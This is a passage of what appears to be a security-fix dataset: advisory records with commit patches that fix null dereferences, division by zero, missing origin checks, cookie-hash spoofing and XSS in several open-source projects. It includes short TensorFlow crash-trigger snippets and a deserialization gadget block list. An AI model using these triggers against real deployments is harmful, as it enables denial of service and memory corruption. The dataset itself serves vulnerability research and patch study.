'https:\/\/github.com\/sockjs\/sockjs-node\/raw\/dd7e642cd69ee74385825816d30642c43e051d16\/src%2Fwebjs.coffee', 'patch': \"@@ -45,9 +45,6 @@ fake_response = (req, res) ->\\n             try\\n                 res.write(r.join('\\\\r\\\\n'))\\n             catch x\\n-            try\\n-                res.end()\\n-            catch x\\n         res.setHeader = (k, v) -> headers[k] = v\"}}","message_norm":"merge pull request #266 from cakoose\/backport-writehead-fix\n\nwritehead: don't end() response","language":"en","entities":"[('#266', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/webjs.coffee'])","num_files":1.0},{"index":1525,"vuln_id":"GHSA-c9qf-r67m-p7cg","cwe_id":"{'CWE-476'}","score":7.7,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5dc7f6981fdaf74c8c5be41f393df705841fb7c5'}","dataset":"osv","summary":"Null pointer dereference in `CompressElement` ### Impact\nIt is possible to trigger a null pointer dereference in TensorFlow by passing an invalid input to `tf.raw_ops.CompressElement`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.CompressElement(components=[[]])\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/47a06f40411a69c99f381495f490536972152ac0\/tensorflow\/core\/data\/compression_utils.cc#L34) was accessing the size of a buffer obtained from the return of a separate function call before validating that said buffer is valid.\n\n### Patches\nWe have patched the issue in GitHub commit [5dc7f6981fdaf74c8c5be41f393df705841fb7c5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5dc7f6981fdaf74c8c5be41f393df705841fb7c5).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for  more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. Concurrently, it was resolved in `master` branch as it was also discovered internally and fixed before the report was handled.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5dc7f6981fdaf74c8c5be41f393df705841fb7c5","commit_sha":"5dc7f6981fdaf74c8c5be41f393df705841fb7c5","patch":"SINGLE","chain_ord":"['5dc7f6981fdaf74c8c5be41f393df705841fb7c5']","before_first_fix_commit":"{'de9a4335c96bec8fa69abb89618b1daa4b2459fa'}","last_fix_commit":"5dc7f6981fdaf74c8c5be41f393df705841fb7c5","chain_ord_pos":1.0,"commit_datetime":"05\/15\/2021, 05:07:07","message":"Fix accessing possible nullptr in tensorflow::data::CompressElement and UncompressElement which are used in tf.data.service.\n\nPiperOrigin-RevId: 373920841\nChange-Id: Ia88d78aee09fa19bb53a0f163fd19620d0c68743","author":"A. Unique TensorFlower","comments":null,"stats":"{'additions': 15, 'deletions': 7, 'total': 22}","files":"{'tensorflow\/core\/data\/compression_utils.cc': {'additions': 15, 'deletions': 7, 'changes': 22, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/5dc7f6981fdaf74c8c5be41f393df705841fb7c5\/tensorflow%2Fcore%2Fdata%2Fcompression_utils.cc', 'patch': '@@ -29,9 +29,10 @@ Status CompressElement(const std::vector<Tensor>& element,\\n   int64 total_size = 0;\\n   for (auto& component : element) {\\n     if (DataTypeCanUseMemcpy(component.dtype())) {\\n-      \/\/ Some datatypes can be memcopied, allowing us to save two copies\\n-      \/\/ (AsProtoTensorContent and SerializeToArray).\\n-      total_size += DMAHelper::buffer(&component)->size();\\n+      const TensorBuffer* buffer = DMAHelper::buffer(&component);\\n+      if (buffer) {\\n+        total_size += buffer->size();\\n+      }\\n     } else {\\n       non_memcpy_components.emplace_back();\\n       component.AsProtoTensorContent(&non_memcpy_components.back());\\n@@ -53,8 +54,10 @@ Status CompressElement(const std::vector<Tensor>& element,\\n     component.shape().AsProto(metadata->mutable_tensor_shape());\\n     if (DataTypeCanUseMemcpy(component.dtype())) {\\n       const TensorBuffer* buffer = DMAHelper::buffer(&component);\\n-      memcpy(position, buffer->data(), buffer->size());\\n-      metadata->set_tensor_size_bytes(buffer->size());\\n+      if (buffer) {\\n+        memcpy(position, buffer->data(), buffer->size());\\n+        metadata->set_tensor_size_bytes(buffer->size());\\n+      }\\n     } else {\\n       TensorProto& proto = non_memcpy_components[non_memcpy_component_index++];\\n       proto.SerializeToArray(position, proto.ByteSizeLong());\\n@@ -94,8 +97,13 @@ Status UncompressElement(const CompressedElement& compressed,\\n     if (DataTypeCanUseMemcpy(metadata.dtype())) {\\n       out->emplace_back(metadata.dtype(), metadata.tensor_shape());\\n       TensorBuffer* buffer = DMAHelper::buffer(&out->back());\\n-      iov[i].iov_base = buffer->data();\\n-      iov[i].iov_len = buffer->size();\\n+      if (buffer) {\\n+        iov[i].iov_base = buffer->data();\\n+        iov[i].iov_len = buffer->size();\\n+      } else {\\n+        iov[i].iov_base = nullptr;\\n+        iov[i].iov_len = 0;\\n+      }\\n     } else {\\n       \/\/ Allocate an empty Tensor. We will fill it out later after\\n       \/\/ uncompressing into the tensor_proto_str.'}}","message_norm":"fix accessing possible nullptr in tensorflow::data::compresselement and uncompresselement which are used in tf.data.service.\n\npiperorigin-revid: 373920841\nchange-id: ia88d78aee09fa19bb53a0f163fd19620d0c68743","language":"en","entities":"[('fix', 'ACTION', ''), ('nullptr', 'SECWORD', ''), ('tensorflow::data::compresselement', 'SECWORD', ''), ('uncompresselement', 'SECWORD', ''), ('373920841', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/data\/compression_utils.cc'])","num_files":1.0},{"index":1528,"vuln_id":"GHSA-cchx-mfrc-fwqr","cwe_id":"{'CWE-200', 'CWE-287'}","score":7.5,"chain":"{'https:\/\/github.com\/symfony\/symfony\/commit\/a29ce2817cf43bb1850cf6af114004ac26c7a081'}","dataset":"osv","summary":"Improper authentication in Symfony In Symfony before 2.7.51, 2.8.x before 2.8.50, 3.x before 3.4.26, 4.x before 4.1.12, and 4.2.x before 4.2.7, a vulnerability would allow an attacker to authenticate as a privileged user on sites with user registration and remember me login functionality enabled. This is related to symfony\/security.","published_date":"2020-02-12","chain_len":1,"project":"https:\/\/github.com\/symfony\/symfony","commit_href":"https:\/\/github.com\/symfony\/symfony\/commit\/a29ce2817cf43bb1850cf6af114004ac26c7a081","commit_sha":"a29ce2817cf43bb1850cf6af114004ac26c7a081","patch":"SINGLE","chain_ord":"['a29ce2817cf43bb1850cf6af114004ac26c7a081']","before_first_fix_commit":"{'3e0b2354dbc8813a1f5ff91757e1dce40dfe31b4'}","last_fix_commit":"a29ce2817cf43bb1850cf6af114004ac26c7a081","chain_ord_pos":1.0,"commit_datetime":"04\/06\/2019, 10:40:18","message":"[Security] Add a separator in the remember me cookie hash","author":"Pascal Borreli","comments":"{'com_1': {'author': 'simoheinonen', 'datetime': '06\/05\/2019, 12:10:12', 'body': 'This logs out all users with the old hash. \ud83d\ude10'}, 'com_2': {'author': 'stof', 'datetime': '06\/05\/2019, 12:18:28', 'body': '@simoheinonen which is better than allowing to spoof remember me cookies'}, 'com_3': {'author': 'simoheinonen', 'datetime': '06\/05\/2019, 12:24:05', 'body': 'Yeah but worth mentioning imo. Logging out thousands of users might cost a lot'}, 'com_4': {'author': 'stefanospetrakis', 'datetime': '06\/25\/2019, 16:29:42', 'body': \"One remark regarding this (a bit too late perhaps);\\r\\nI would like this a little bit shorter for readability\/redundancy\/etc., sth like that:\\r\\n`return hash_hmac('sha256', implode(self::COOKIE_DELIMITER, func_get_args()), $this->getSecret());`\\r\\n\\r\\nAny point to opening a follow-up issue for this?\"}, 'com_5': {'author': 'stof', 'datetime': '06\/25\/2019, 16:37:07', 'body': '@stefanospetrakis this code is less explicit about what gets included in the hash exactly, due to using `func_get_args` instead of the actual arguments. So to me, this actually makes it less readable.'}, 'com_6': {'author': 'stefanospetrakis', 'datetime': '06\/25\/2019, 19:53:54', 'body': '@stof Fair enough, how about the following:\\r\\n\\r\\n`implode(self::COOKIE_DELIMITER, [$class, $username, $expires, $password])`'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/Symfony\/Component\/Security\/Http\/RememberMe\/TokenBasedRememberMeServices.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/symfony\/symfony\/raw\/a29ce2817cf43bb1850cf6af114004ac26c7a081\/src%2FSymfony%2FComponent%2FSecurity%2FHttp%2FRememberMe%2FTokenBasedRememberMeServices.php', 'patch': \"@@ -120,6 +120,6 @@ protected function generateCookieValue($class, $username, $expires, $password)\\n      *\/\\n     protected function generateCookieHash($class, $username, $expires, $password)\\n     {\\n-        return hash_hmac('sha256', $class.$username.$expires.$password, $this->getSecret());\\n+        return hash_hmac('sha256', $class.self::COOKIE_DELIMITER.$username.self::COOKIE_DELIMITER.$expires.self::COOKIE_DELIMITER.$password, $this->getSecret());\\n     }\\n }\"}}","message_norm":"[security] add a separator in the remember me cookie hash","language":"en","entities":"[('security', 'SECWORD', ''), ('add', 'ACTION', ''), ('cookie', 'SECWORD', ''), ('hash', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Symfony\/Component\/Security\/Http\/RememberMe\/TokenBasedRememberMeServices.php'])","num_files":1.0},{"index":1536,"vuln_id":"GHSA-cf66-xwfp-gvc4","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/webpack\/webpack-dev-server\/commit\/f18e5adf123221a1015be63e1ca2491ca45b8d10'}","dataset":"osv","summary":"Missing Origin Validation in webpack-dev-server Versions of `webpack-dev-server` before 3.1.10 are missing origin validation on the websocket server. This vulnerability allows a remote attacker to steal a developer's source code because the origin of requests to the websocket server that is used for Hot Module Replacement (HMR) are not validated.\n\n\n## Recommendation\nFor `webpack-dev-server` update to version 3.1.11 or later.","published_date":"2019-01-04","chain_len":1,"project":"https:\/\/github.com\/webpack\/webpack-dev-server","commit_href":"https:\/\/github.com\/webpack\/webpack-dev-server\/commit\/f18e5adf123221a1015be63e1ca2491ca45b8d10","commit_sha":"f18e5adf123221a1015be63e1ca2491ca45b8d10","patch":"SINGLE","chain_ord":"['f18e5adf123221a1015be63e1ca2491ca45b8d10']","before_first_fix_commit":"{'e1bd264b9ce5fb0a05a62754883f6c8a36fbc51b'}","last_fix_commit":"f18e5adf123221a1015be63e1ca2491ca45b8d10","chain_ord_pos":1.0,"commit_datetime":"07\/24\/2018, 16:57:43","message":"check origin header for websocket connection","author":"Tobias Koppers","comments":"{'com_1': {'author': 'hackel', 'datetime': '11\/09\/2018, 05:45:42', 'body': 'Any chance this security fix could be backported to 2.x?\\r\\nJust noticed this.  https:\/\/nodesecurity.io\/advisories\/725'}, 'com_2': {'author': 'alexander-akait', 'datetime': '11\/09\/2018, 10:14:03', 'body': 'No, please update to `3` version, `2` is deprecated'}, 'com_3': {'author': 'aeegvk', 'datetime': '01\/02\/2019, 08:33:02', 'body': 'Updated to suggested version 3.1.11 and latest version 3.1.14 but still getting a vulnerability report. How come?'}, 'com_4': {'author': 'oles', 'datetime': '01\/02\/2019, 10:54:04', 'body': 'Experiencing the same as @aeegvk.\\r\\n\\r\\nSeems like the error is in https:\/\/www.npmjs.com\/advisories\/725 though.'}, 'com_5': {'author': 'charlesfaustin', 'datetime': '01\/02\/2019, 13:35:57', 'body': '> Updated to suggested version 3.1.11 and latest version 3.1.14 but still getting a vulnerability report. How come?\\r\\n\\r\\nthere appears to be a typo in the npm vulnerability database\\r\\nhttps:\/\/npm.community\/t\/npm-audit-sweems-to-get-semver-wrong\/4352\/4'}}","stats":"{'additions': 9, 'deletions': 2, 'total': 11}","files":"{'lib\/Server.js': {'additions': 9, 'deletions': 2, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/webpack\/webpack-dev-server\/raw\/f18e5adf123221a1015be63e1ca2491ca45b8d10\/lib%2FServer.js', 'patch': '@@ -513,13 +513,15 @@ Server.prototype.setContentHeaders = function (req, res, next) {\\n   next();\\n };\\n \\n-Server.prototype.checkHost = function (headers) {\\n+Server.prototype.checkHost = function (headers, headerToCheck) {\\n   \/\/ allow user to opt-out this security check, at own risk\\n   if (this.disableHostCheck) return true;\\n \\n+  if (!headerToCheck) headerToCheck = \"host\";\\n+\\n   \/\/ get the Host header and extract hostname\\n   \/\/ we don\\'t care about port not matching\\n-  const hostHeader = headers.host;\\n+  const hostHeader = headers[headerToCheck];\\n   if (!hostHeader) return false;\\n \\n   \/\/ use the node url-parser to retrieve the hostname from the host-header.\\n@@ -589,6 +591,11 @@ Server.prototype.listen = function (port, hostname, fn) {\\n         conn.close();\\n         return;\\n       }\\n+      if (!this.checkHost(conn.headers, \"origin\")) {\\n+        this.sockWrite([conn], \\'error\\', \\'Invalid Origin header\\');\\n+        conn.close();\\n+        return;\\n+      }\\n       this.sockets.push(conn);\\n \\n       conn.on(\\'close\\', () => {'}}","message_norm":"check origin header for websocket connection","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Server.js'])","num_files":1.0},{"index":1537,"vuln_id":"GHSA-cf6r-3wgc-h863","cwe_id":"{'CWE-502'}","score":7.5,"chain":"{'https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/41b7f9b90149e9d44a65a8261a8deedc7186f6af', 'https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/819cdbcab51c6da9fb896380f2d46e9b7d4fdc3b'}","dataset":"osv","summary":"Polymorphic deserialization of malicious object in jackson-databind A flaw was discovered in jackson-databind in versions before 2.9.10, 2.8.11.5 and 2.6.7.3, where it would permit polymorphic deserialization of a malicious object using commons-configuration 1 and 2 JNDI classes. An attacker could use this flaw to execute arbitrary code.","published_date":"2020-05-15","chain_len":2,"project":"https:\/\/github.com\/FasterXML\/jackson-databind","commit_href":"https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/41b7f9b90149e9d44a65a8261a8deedc7186f6af","commit_sha":"41b7f9b90149e9d44a65a8261a8deedc7186f6af","patch":"MULTI","chain_ord":"['41b7f9b90149e9d44a65a8261a8deedc7186f6af', '819cdbcab51c6da9fb896380f2d46e9b7d4fdc3b']","before_first_fix_commit":"{'41b7f9b90149e9d44a65a8261a8deedc7186f6af', 'f4f4a4e035ada20a532a5400e5f093a5a575a0ed'}","last_fix_commit":"819cdbcab51c6da9fb896380f2d46e9b7d4fdc3b","chain_ord_pos":1.0,"commit_datetime":"09\/20\/2019, 05:57:18","message":"Actual #2462 fix (prev commit only updates release notes)","author":"Tatu Saloranta","comments":null,"stats":"{'additions': 5, 'deletions': 1, 'total': 6}","files":"{'src\/main\/java\/com\/fasterxml\/jackson\/databind\/jsontype\/impl\/SubTypeValidator.java': {'additions': 5, 'deletions': 1, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/FasterXML\/jackson-databind\/raw\/41b7f9b90149e9d44a65a8261a8deedc7186f6af\/src%2Fmain%2Fjava%2Fcom%2Ffasterxml%2Fjackson%2Fdatabind%2Fjsontype%2Fimpl%2FSubTypeValidator.java', 'patch': '@@ -106,7 +106,11 @@\\n \\n         \/\/ [databind#2420]: CXF\/JAX-RS provider\/XSLT\\n         s.add(\"org.apache.cxf.jaxrs.provider.XSLTJaxbProvider\");\\n-        \\n+\\n+        \/\/ [databind#2462]: commons-configuration \/ -2\\n+        s.add(\"org.apache.commons.configuration.JNDIConfiguration\");\\n+        s.add(\"org.apache.commons.configuration2.JNDIConfiguration\");\\n+\\n         DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);\\n     }'}}","message_norm":"actual #2462 fix (prev commit only updates release notes)","language":"en","entities":"[('#2462', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/com\/fasterxml\/jackson\/databind\/jsontype\/impl\/SubTypeValidator.java'])","num_files":1.0},{"index":1546,"vuln_id":"GHSA-cfpj-3q4c-jhvr","cwe_id":"{'CWE-369'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/718721986aa137691ee23f03638867151f74935f'}","dataset":"osv","summary":"Division by zero in TFLite ### Impact\nThe implementation of fully connected layers in TFLite is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/lite\/kernels\/fully_connected.cc#L226):\n\n```cc\nconst int batch_size = input_size \/ filter->dims->data[1];\n```\n\nAn attacker can craft a model such that `filter->dims->data[1]` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [718721986aa137691ee23f03638867151f74935f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/718721986aa137691ee23f03638867151f74935f).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. Concurrently, it has also been reported by Yakun Zhang of Baidu Security.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/718721986aa137691ee23f03638867151f74935f","commit_sha":"718721986aa137691ee23f03638867151f74935f","patch":"SINGLE","chain_ord":"['718721986aa137691ee23f03638867151f74935f']","before_first_fix_commit":"{'985f07145a0cab0fd6018fdfc0b221b17e0c5a88'}","last_fix_commit":"718721986aa137691ee23f03638867151f74935f","chain_ord_pos":1.0,"commit_datetime":"07\/16\/2021, 13:49:45","message":"Prevent division by 0 in `fully_connected.cc`\n\nPiperOrigin-RevId: 385137282\nChange-Id: If201e69b6e0048f0be001330b4b977e2b46db2cb","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/lite\/kernels\/fully_connected.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/718721986aa137691ee23f03638867151f74935f\/tensorflow%2Flite%2Fkernels%2Ffully_connected.cc', 'patch': '@@ -223,6 +223,7 @@ TfLiteStatus PrepareImpl(TfLiteContext* context, TfLiteNode* node) {\\n   }\\n \\n   TF_LITE_ENSURE_EQ(context, NumDimensions(filter), 2);\\n+  TF_LITE_ENSURE(context, filter->dims->data[1] != 0);\\n   const int batch_size = input_size \/ filter->dims->data[1];\\n   const int num_units = filter->dims->data[0];'}}","message_norm":"prevent division by 0 in `fully_connected.cc`\n\npiperorigin-revid: 385137282\nchange-id: if201e69b6e0048f0be001330b4b977e2b46db2cb","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('385137282', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/fully_connected.cc'])","num_files":1.0},{"index":1547,"vuln_id":"GHSA-cfx7-2xpc-8w4h","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2c74674348a4708ced58ad6eb1b23354df8ee044'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of `BatchToSpaceNd` ### Impact\nThe implementation of the `BatchToSpaceNd` TFLite operator is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/b5ed552fe55895aee8bd8b191f744a069957d18d\/tensorflow\/lite\/kernels\/batch_to_space_nd.cc#L81-L82):\n\n```cc\nTF_LITE_ENSURE_EQ(context, output_batch_size % block_shape[dim], 0);\noutput_batch_size = output_batch_size \/ block_shape[dim];\n```\n\nAn attacker can craft a model such that one dimension of the `block` input is 0. Hence, the corresponding value in `block_shape` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [2c74674348a4708ced58ad6eb1b23354df8ee044](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2c74674348a4708ced58ad6eb1b23354df8ee044).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2c74674348a4708ced58ad6eb1b23354df8ee044","commit_sha":"2c74674348a4708ced58ad6eb1b23354df8ee044","patch":"SINGLE","chain_ord":"['2c74674348a4708ced58ad6eb1b23354df8ee044']","before_first_fix_commit":"{'b5ed552fe55895aee8bd8b191f744a069957d18d'}","last_fix_commit":"2c74674348a4708ced58ad6eb1b23354df8ee044","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 20:57:37","message":"Prevent division by 0\n\nPiperOrigin-RevId: 370979352\nChange-Id: Ic79191c316d986fc6072ecaebfec9d5f2b924d00","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/lite\/kernels\/batch_to_space_nd.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/2c74674348a4708ced58ad6eb1b23354df8ee044\/tensorflow%2Flite%2Fkernels%2Fbatch_to_space_nd.cc', 'patch': '@@ -78,6 +78,7 @@ TfLiteStatus ResizeOutputTensor(TfLiteContext* context,\\n   int output_batch_size = input_size->data[0];\\n   for (int dim = 0; dim < spatial_dims_num; ++dim) {\\n     \/\/ Number of batch must be multiple of (block_shape[dim]).\\n+    TF_LITE_ENSURE(context, block_shape[dim] != 0);\\n     TF_LITE_ENSURE_EQ(context, output_batch_size % block_shape[dim], 0);\\n     output_batch_size = output_batch_size \/ block_shape[dim];\\n     output_size->data[dim + 1] = input_size->data[dim + 1] * block_shape[dim] -'}}","message_norm":"prevent division by 0\n\npiperorigin-revid: 370979352\nchange-id: ic79191c316d986fc6072ecaebfec9d5f2b924d00","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370979352', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/batch_to_space_nd.cc'])","num_files":1.0},{"index":1548,"vuln_id":"GHSA-cg3h-rc9q-g8v9","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/6ccb5c12fc1be065ebce9c89c4677ee939b88597'}","dataset":"osv","summary":"Cross-site Scripting in pimcore pimcore version 10.3.0 and prior is vulnerable to cross-site scripting.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/6ccb5c12fc1be065ebce9c89c4677ee939b88597","commit_sha":"6ccb5c12fc1be065ebce9c89c4677ee939b88597","patch":"SINGLE","chain_ord":"['6ccb5c12fc1be065ebce9c89c4677ee939b88597']","before_first_fix_commit":"{'7b6b2229ed3f19da1632afcbf9b8fec6d768faad'}","last_fix_commit":"6ccb5c12fc1be065ebce9c89c4677ee939b88597","chain_ord_pos":1.0,"commit_datetime":"02\/07\/2022, 12:03:58","message":"[Admin] Website Settings - Escape grid values properly","author":"dpahuja","comments":null,"stats":"{'additions': 19, 'deletions': 7, 'total': 26}","files":"{'bundles\/AdminBundle\/Resources\/public\/js\/pimcore\/settings\/website.js': {'additions': 19, 'deletions': 7, 'changes': 26, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/6ccb5c12fc1be065ebce9c89c4677ee939b88597\/bundles%2FAdminBundle%2FResources%2Fpublic%2Fjs%2Fpimcore%2Fsettings%2Fwebsite.js', 'patch': '@@ -36,7 +36,7 @@ pimcore.settings.website = Class.create({\\n                 border:false,\\n                 layout:\"fit\",\\n                 closable:true,\\n-                items:[this.getRowEditor()]\\n+                items:[this.getRowEditor()],\\n             });\\n \\n             var tabPanel = Ext.getCmp(\"pimcore_panel_tabs\");\\n@@ -133,6 +133,7 @@ pimcore.settings.website = Class.create({\\n                 dataIndex: \\'data\\',\\n                 flex: 300,\\n                 editable: true,\\n+                editor: new Ext.form.TextField({}),\\n                 renderer: this.getCellRenderer.bind(this),\\n             },\\n             {text: t(\"site\"), flex: 100, sortable:true, dataIndex: \"siteId\",\\n@@ -303,7 +304,10 @@ pimcore.settings.website = Class.create({\\n             bodyCls: \"pimcore_editable_grid\",\\n             stripeRows:true,\\n             columns : {\\n-                items: typesColumns\\n+                items: typesColumns,\\n+                defaults: {\\n+                    renderer: Ext.util.Format.htmlEncode\\n+                },\\n             },\\n             sm:  Ext.create(\\'Ext.selection.RowModel\\', {}),\\n             bbar:this.pagingtoolbar,\\n@@ -359,15 +363,23 @@ pimcore.settings.website = Class.create({\\n     },\\n \\n     getCellEditor: function (record) {\\n-        var data = record.data;\\n+        let data = record.data;\\n \\n-        var type = data.type;\\n-        var property;\\n+        let type = data.type;\\n+        let property;\\n \\n         if (type === \"text\") {\\n-            property = Ext.create(\\'Ext.form.TextField\\');\\n+            property = {\\n+                xtype: \\'textfield\\',\\n+                flex: 1,\\n+                value: data.data\\n+            }\\n         } else if (type == \"textarea\") {\\n-            property = Ext.create(\\'Ext.form.TextArea\\');\\n+            property = {\\n+                xtype: \"textarea\",\\n+                flex: 1,\\n+                value: data.data\\n+            }\\n         } else if (type == \"document\" || type == \"asset\" || type == \"object\") {\\n             property = {\\n                 xtype: \\'textfield\\','}}","message_norm":"[admin] website settings - escape grid values properly","language":"af","entities":"[('admin', 'SECWORD', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Resources\/public\/js\/pimcore\/settings\/website.js'])","num_files":1.0},{"index":1551,"vuln_id":"GHSA-cgfm-62j4-v4rf","cwe_id":"{'CWE-125'}","score":7.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/87158f43f05f2720a374f3e6d22a7aaa3a33f750'}","dataset":"osv","summary":"Heap out of bounds access in sparse reduction operations ### Impact\nThe implementation of sparse reduction operations in TensorFlow can trigger accesses outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\nx = tf.SparseTensor(\n      indices=[[773, 773, 773], [773, 773, 773]],\n      values=[1, 1],\n      dense_shape=[337, 337, 337])\ntf.sparse.reduce_sum(x, 1)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1bc56203f21a5a4995311825ffaba7a670d7747\/tensorflow\/core\/kernels\/sparse_reduce_op.cc#L217-L228) fails to validate that each reduction group does not overflow and that each corresponding index does not point to outside the bounds of the input tensor.\n\n### Patches\nWe have patched the issue in GitHub commit [87158f43f05f2720a374f3e6d22a7aaa3a33f750](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/87158f43f05f2720a374f3e6d22a7aaa3a33f750). \n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/87158f43f05f2720a374f3e6d22a7aaa3a33f750","commit_sha":"87158f43f05f2720a374f3e6d22a7aaa3a33f750","patch":"SINGLE","chain_ord":"['87158f43f05f2720a374f3e6d22a7aaa3a33f750']","before_first_fix_commit":"{'9c7f40e5f1b5b74156ad4d7bc20b8d69bdedbe29'}","last_fix_commit":"87158f43f05f2720a374f3e6d22a7aaa3a33f750","chain_ord_pos":1.0,"commit_datetime":"07\/31\/2021, 04:11:18","message":"Prevent heap OOB in sparse reduction ops.\n\nPiperOrigin-RevId: 387934524\nChange-Id: I894aa30f1e454f09b471d565b4a325da49322c1a","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'tensorflow\/core\/kernels\/sparse_reduce_op.cc': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/87158f43f05f2720a374f3e6d22a7aaa3a33f750\/tensorflow%2Fcore%2Fkernels%2Fsparse_reduce_op.cc', 'patch': '@@ -219,7 +219,20 @@ class SparseReduceOp : public OpKernel {\\n     sp.Reorder<T>(reduction.reorder_dims);\\n     for (const auto &g : sp.group(reduction.group_by_dims)) {\\n       Op::template Run<T>(ctx, reduced_val, g.template values<T>());\\n+      OP_REQUIRES(ctx,\\n+                  output_strides.empty() ||\\n+                  (g.group().size() == output_strides.size()),\\n+                  errors::Internal(\\n+                      \"Expected group size and output_strides size to match\",\\n+                      \", 